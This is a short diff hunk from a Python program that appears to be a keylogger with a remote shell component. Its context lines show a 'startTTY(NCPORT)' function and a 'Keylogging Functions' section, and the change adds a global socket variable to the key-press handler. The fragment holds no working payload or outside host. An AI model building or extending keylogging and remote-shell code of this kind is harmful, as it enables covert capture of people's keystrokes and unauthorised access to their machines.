@@ -30,6 +30,7 @@ def startTTY(NCPORT):
 
 #Keylogging Functions
 def on_key_press(key):
+    global s
     if not keyLoggerAlive:
         return False
     if key == keyboard.Key.enter:
